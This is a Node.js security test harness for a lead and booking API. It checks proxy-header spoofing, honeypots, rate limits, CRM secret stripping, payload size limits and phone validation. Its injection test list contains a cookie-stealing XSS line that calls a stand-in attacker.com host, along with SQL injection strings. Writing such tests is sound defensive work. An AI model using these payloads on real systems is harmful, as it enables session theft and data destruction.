import { createServer } from 'node:http';
import { readFile } from 'node:fs/promises';
import { resolve } from 'node:path';
import { createApiRouter } from '../server/apiRouter.mjs';
import { StatusCache } from '../server/statusCache.mjs';
import { getClientIp } from '../server/leads.mjs';

async function runAdversarialSecurityChallenges() {
  console.log('=================================================================');
  console.log('CHALLENGER 1: ADVERSARIAL EMPIRICAL SECURITY STRESS HARNESS');
  console.log('=================================================================\n');

  let passed = 0;
  let failed = 0;

  function assert(condition, message) {
    if (!condition) {
      console.error(`❌ FAIL: ${message}`);
      failed++;
      throw new Error(message);
    } else {
      console.log(`✔ PASS: ${message}`);
      passed++;
    }
  }

  // Set up test server
  const router = createApiRouter();
  const server = createServer((req, res) =>
    router(req, res, () => {
      res.statusCode = 404;
      res.setHeader('Content-Type', 'application/json');
      res.end(JSON.stringify({ error: 'Endpoint not found' }));
    })
  );

  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  const port = server.address().port;
  const baseUrl = `http://127.0.0.1:${port}`;
  console.log(`Test server active on ${baseUrl}\n`);

  const post = async (endpoint, body, headers = {}) => {
    const res = await fetch(`${baseUrl}${endpoint}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Connection': 'close',
        ...headers
      },
      body: typeof body === 'string' ? body : JSON.stringify(body)
    });
    const text = await res.text();
    let json = null;
    try {
      json = JSON.parse(text);
    } catch {}
    return { status: res.status, headers: res.headers, text, json };
  };

  const get = async (endpoint, headers = {}) => {
    const res = await fetch(`${baseUrl}${endpoint}`, {
      method: 'GET',
      headers: {
        'Connection': 'close',
        ...headers
      }
    });
    const text = await res.text();
    let json = null;
    try {
      json = JSON.parse(text);
    } catch {}
    return { status: res.status, headers: res.headers, text, json };
  };

  try {
    // =========================================================================
    // Challenge 1: Advanced IP Spoofing & Header Smuggling Variations
    // =========================================================================
    console.log('--- Challenge 1: IP Spoofing & Header Smuggling ---');
    delete process.env.TRUST_PROXY;

    const mockSocketReq = (headers) => ({
      headers,
      socket: { remoteAddress: '192.168.10.50' }
    });

    assert(
      getClientIp(mockSocketReq({ 'x-forwarded-for': '8.8.8.8' })) === '192.168.10.50',
      'TRUST_PROXY unset: X-Forwarded-For ignored'
    );
    assert(
      getClientIp(mockSocketReq({ 'x-real-ip': '8.8.8.8' })) === '192.168.10.50',
      'TRUST_PROXY unset: X-Real-IP ignored'
    );
    assert(
      getClientIp(mockSocketReq({ 'forwarded': 'for=8.8.8.8' })) === '192.168.10.50',
      'TRUST_PROXY unset: Forwarded header ignored'
    );
    assert(
      getClientIp(mockSocketReq({ 'x-forwarded-for': '8.8.8.8, 10.0.0.1, 127.0.0.1' })) === '192.168.10.50',
      'TRUST_PROXY unset: multi-hop X-Forwarded-For ignored'
    );

    // With TRUST_PROXY=true
    process.env.TRUST_PROXY = 'true';
    assert(
      getClientIp(mockSocketReq({ 'x-forwarded-for': '203.0.113.195, 70.41.3.18' })) === '203.0.113.195',
      'TRUST_PROXY=true: extracts first client IP'
    );
    assert(
      getClientIp(mockSocketReq({ 'x-forwarded-for': '   203.0.113.196   , 70.41.3.18' })) === '203.0.113.196',
      'TRUST_PROXY=true: trims whitespace around IP'
    );
    assert(
      getClientIp(mockSocketReq({ 'x-forwarded-for': '' })) === '192.168.10.50',
      'TRUST_PROXY=true: empty string falls back to socket address'
    );
    delete process.env.TRUST_PROXY;

    // =========================================================================
    // Challenge 2: Honeypot Deep Verification & Zero Disk Persistence
    // =========================================================================
    console.log('\n--- Challenge 2: Honeypot Deep Verification ---');
    const leadsFile = resolve('.local/leads.ndjson');
    let leadsBefore = 0;
    try {
      const content = await readFile(leadsFile, 'utf8');
      leadsBefore = content.trim() ? content.trim().split('\n').length : 0;
    } catch {
      leadsBefore = 0;
    }

    process.env.TRUST_PROXY = 'true';
    const honeyVariants = [
      { website: 'http://spambot.ru' },
      { website: 'https://evil.example.com/exploit?a=1' },
      { website: 'spammer@example.com' },
      { website: '<script>alert(1)</script>' },
      { website: '1' },
      { website: 'true' }
    ];

    let hIdx = 1;
    for (const h of honeyVariants) {
      const ip = `172.16.1.${hIdx++}`;
      // On /api/leads
      const rLead = await post(
        '/api/leads',
        {
          name: 'Bot Crawler',
          phone: '+7 (701) 999-99-99',
          consent: true,
          topic: 'Buy cheap watches',
          ...h
        },
        { 'x-forwarded-for': ip }
      );
      assert(rLead.status === 200, `Honeypot lead [${h.website}] returned 200 OK`);
      assert(rLead.json?.success === true, `Honeypot response JSON indicates success`);
      assert(Boolean(rLead.json?.id), `Honeypot returns mock opaque ID`);

      // On /api/booking
      const rBook = await post(
        '/api/booking',
        {
          name: 'Bot Booker',
          phone: '+7 (702) 888-88-88',
          consent: true,
          apartmentId: 'shattyq-1-1-1',
          ...h
        },
        { 'x-forwarded-for': `172.16.2.${hIdx}` }
      );
      assert(rBook.status === 200, `Honeypot booking [${h.website}] returned 200 OK`);
      assert(rBook.json?.success === true, `Honeypot booking indicates success`);
      assert(Boolean(rBook.json?.bookingId), `Honeypot returns mock bookingId`);
    }

    // Verify 0 lines added to leads.ndjson
    let leadsAfter = 0;
    try {
      const content = await readFile(leadsFile, 'utf8');
      leadsAfter = content.trim() ? content.trim().split('\n').length : 0;
    } catch {
      leadsAfter = 0;
    }
    assert(leadsAfter === leadsBefore, `Zero lines persisted during ${honeyVariants.length * 2} honeypot tests`);

    // Verify Honeypot Rate Limiting Interaction: 4th honeypot from SAME IP returns 429
    const spammerSameIp = '172.16.99.1';
    const hp1 = await post('/api/leads', { name: 'Bot', phone: '+7 701 111 22 33', consent: true, website: 'bot1' }, { 'x-forwarded-for': spammerSameIp });
    const hp2 = await post('/api/leads', { name: 'Bot', phone: '+7 701 111 22 33', consent: true, website: 'bot2' }, { 'x-forwarded-for': spammerSameIp });
    const hp3 = await post('/api/leads', { name: 'Bot', phone: '+7 701 111 22 33', consent: true, website: 'bot3' }, { 'x-forwarded-for': spammerSameIp });
    const hp4 = await post('/api/leads', { name: 'Bot', phone: '+7 701 111 22 33', consent: true, website: 'bot4' }, { 'x-forwarded-for': spammerSameIp });
    assert(hp1.status === 200 && hp2.status === 200 && hp3.status === 200, 'First 3 honeypots returned 200 OK');
    assert(hp4.status === 429, '4th honeypot from same IP blocked with 429 (DoS prevention at router boundary)');

    // =========================================================================
    // Challenge 3: Extreme Burst Concurrency & Atomic Rate Limiter
    // =========================================================================
    console.log('\n--- Challenge 3: Extreme Burst Concurrency ---');
    const burstIp = '172.31.254.1';
    const burstSize = 25; // 25 simultaneous requests
    const burstPromises = [];

    for (let i = 0; i < burstSize; i++) {
      burstPromises.push(
        post(
          '/api/leads',
          {
            name: `Burst Tester ${i}`,
            phone: '+7 701 555 44 33',
            consent: true,
            topic: `Burst request #${i}`
          },
          { 'x-forwarded-for': burstIp }
        )
      );
    }

    const burstResults = await Promise.all(burstPromises);
    const pass201 = burstResults.filter((r) => r.status === 201).length;
    const block429 = burstResults.filter((r) => r.status === 429).length;

    console.log(`Burst (${burstSize} reqs): ${pass201} passed (201), ${block429} blocked (429)`);
    assert(pass201 === 3, `Strictly 3 requests accepted out of ${burstSize}`);
    assert(block429 === burstSize - 3, `Strictly ${burstSize - 3} requests blocked (429)`);

    // Booking endpoint also has independent rate limiting
    const bookingBurstIp = '172.31.254.2';
    const bookPromises = [];
    for (let i = 0; i < 10; i++) {
      bookPromises.push(
        post(
          '/api/booking',
          {
            name: `Booker ${i}`,
            phone: '+7 702 333 22 11',
            consent: true,
            apartmentId: 'shattyq-1-2-3'
          },
          { 'x-forwarded-for': bookingBurstIp }
        )
      );
    }
    const bookResults = await Promise.all(bookPromises);
    const bookPass = bookResults.filter((r) => r.status === 201).length;
    const bookBlock = bookResults.filter((r) => r.status === 429).length;
    assert(bookPass === 3, `Booking: strictly 3 requests accepted`);
    assert(bookBlock === 7, `Booking: strictly 7 requests blocked (429)`);

    // =========================================================================
    // Challenge 4: CRM Internal ID and Schema Leakage in StatusCache
    // =========================================================================
    console.log('\n--- Challenge 4: CRM Internal ID & Schema Leakage ---');

    const testCache = new StatusCache(1000);
    const maliciousMockAdapter = {
      isConfigured: () => true,
      fetchApartmentStatuses: async () => [
        {
          id: 10452, // Raw numeric Bitrix ID
          publicId: 'shattyq-1-1-1',
          status: 'available',
          stageId: 'C:AVAILABLE',
          UF_CRM_INTERNAL_DEAL: 'SECRET_DEAL_999',
          WEBHOOK_KEY: 'secret_token_12345'
        },
        {
          id: 99999, // Raw numeric ID with no publicId
          status: 'reserved'
        },
        {
          id: 88888,
          title: 'shattyq-2-3-4', // Uses valid public title
          status: 'reserved',
          UF_CRM_PRICE: 50000000
        },
        {
          id: 77777,
          xmlId: '12345', // xmlId is purely numeric -> MUST BE STRIPPED
          status: 'sold'
        }
      ]
    };

    const cacheResult = await testCache.getStatuses(maliciousMockAdapter);
    console.log('StatusCache output keys:', Object.keys(cacheResult.statuses));

    assert('shattyq-1-1-1' in cacheResult.statuses, 'Allowed valid publicId shattyq-1-1-1');
    assert('shattyq-2-3-4' in cacheResult.statuses, 'Allowed valid title shattyq-2-3-4');
    assert(!('10452' in cacheResult.statuses), 'Stripped raw numeric CRM ID 10452');
    assert(!('99999' in cacheResult.statuses), 'Stripped raw numeric CRM ID 99999');
    assert(!('88888' in cacheResult.statuses), 'Stripped raw numeric CRM ID 88888');
    assert(!('77777' in cacheResult.statuses), 'Stripped raw numeric CRM ID 77777');
    assert(!('12345' in cacheResult.statuses), 'Stripped purely numeric xmlId 12345');

    const jsonString = JSON.stringify(cacheResult);
    assert(!jsonString.includes('UF_CRM'), 'Zero UF_CRM fields in cache JSON');
    assert(!jsonString.includes('SECRET_DEAL'), 'Zero deal tokens in cache JSON');
    assert(!jsonString.includes('secret_token'), 'Zero webhook secrets in cache JSON');

    // =========================================================================
    // Challenge 5: Payload Injection, Bounds, and Fuzzing
    // =========================================================================
    console.log('\n--- Challenge 5: Payload Injection, Bounds, & Fuzzing ---');
    const fuzzIpBase = '172.20.0.';
    let fIdx = 1;

    const baseLead = {
      name: 'Владимир Петров',
      phone: '+7 (701) 123-45-67',
      consent: true,
      topic: 'Тест'
    };

    // 5.1 Exact boundary testing: 8192 bytes vs 8193 bytes
    const emptyJsonLen = Buffer.byteLength(JSON.stringify({ ...baseLead, topic: '' }));
    const padNeeded = 8192 - emptyJsonLen;
    const body8192 = JSON.stringify({ ...baseLead, topic: 'X'.repeat(padNeeded) });
    assert(Buffer.byteLength(body8192) === 8192, `Constructed body of exact length 8192 bytes`);

    const res8192 = await post('/api/leads', body8192, { 'x-forwarded-for': `${fuzzIpBase}${fIdx++}` });
    assert(res8192.status === 201, `8192 byte payload accepted within 8KB buffer limit`);

    const body8193 = JSON.stringify({ ...baseLead, topic: 'X'.repeat(padNeeded + 1) });
    assert(Buffer.byteLength(body8193) === 8193, `Constructed body of exact length 8193 bytes`);
    const res8193 = await post('/api/leads', body8193, { 'x-forwarded-for': `${fuzzIpBase}${fIdx++}` });
    assert(res8193.status === 413, `8193 byte payload rejected with 413 Payload Too Large`);

    // 5.2 Larger oversized payload: 12KB
    const body12KB = JSON.stringify({ ...baseLead, topic: 'Y'.repeat(12000) });
    const res12KB = await post('/api/leads', body12KB, { 'x-forwarded-for': `${fuzzIpBase}${fIdx++}` });
    assert(res12KB.status === 413, `12KB payload rejected with 413 Payload Too Large`);

    // 5.3 Malformed / Adversarial JSON types
    const badBodies = [
      '{',
      '{"name": "test", broken...',
      'null',
      'undefined',
      '12345',
      'true',
      'false',
      '[]',
      '[{"name": "array element"}]',
      '"just a string"'
    ];

    for (const bb of badBodies) {
      const res = await post('/api/leads', bb, { 'x-forwarded-for': `${fuzzIpBase}${fIdx++}` });
      assert(res.status === 400, `Bad body [${bb.slice(0, 15)}] safely rejected with 400`);
    }

    // 5.4 Injection strings: HTML/XSS and SQLi
    const injections = [
      "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
      "<img src=x onerror=alert('xss')>",
      "<svg onload=alert(1)>",
      "'; DROP TABLE users; --",
      "' OR 1=1 --",
      "UNION SELECT username, password FROM users --",
      "admin' --"
    ];

    for (const inj of injections) {
      const res = await post(
        '/api/leads',
        { ...baseLead, name: inj.slice(0, 70), topic: inj },
        { 'x-forwarded-for': `${fuzzIpBase}${fIdx++}` }
      );
      assert(
        res.status === 201 || res.status === 400,
        `Injection string handled safely without 500 error (status: ${res.status})`
      );
    }

    // 5.5 Phone number fuzzing: letters, symbols, non-KZ prefixes
    const badPhoneList = [
      'abcdefghijk',
      '+1 (212) 555-1234', // US
      '+44 20 7946 0958',  // UK
      '+380 44 123 4567',  // Ukraine
      '+86 10 1234 5678',  // China
      '+7 701 12',         // Too short
      '+7 701 123 45 67 89', // Too long
      '700',
      '00000000000',
      '<script>alert(1)</script>'
    ];

    for (const bp of badPhoneList) {
      const res = await post(
        '/api/leads',
        { ...baseLead, phone: bp },
        { 'x-forwarded-for': `${fuzzIpBase}${fIdx++}` }
      );
      assert(res.status === 400, `Invalid phone [${bp}] rejected with 400`);
    }

    // 5.6 Valid Kazakhstani phone formats accepted and normalized
    const validPhones = [
      '+7 701 123 45 67',
      '+7 (705) 555-44-33',
      '87011234567',
      '+77011234567',
      '8 (777) 111-22-33',
      '++77011234567' // Tolerant multi-plus normalization
    ];

    for (const vp of validPhones) {
      const res = await post(
        '/api/leads',
        { ...baseLead, phone: vp },
        { 'x-forwarded-for': `${fuzzIpBase}${fIdx++}` }
      );
      assert(res.status === 201, `Valid KZ phone [${vp}] accepted with 201`);
    }

    delete process.env.TRUST_PROXY;

    console.log('\n=================================================================');
    console.log(`ALL CHALLENGER ADVERSARIAL TESTS PASSED! (${passed} passed, ${failed} failed)`);
    console.log('=================================================================\n');
  } finally {
    await new Promise((r) => server.close(r));
  }
}

runAdversarialSecurityChallenges().catch((err) => {
  console.error('\n❌ CHALLENGER STRESS HARNESS FAILED:', err);
  process.exit(1);
});
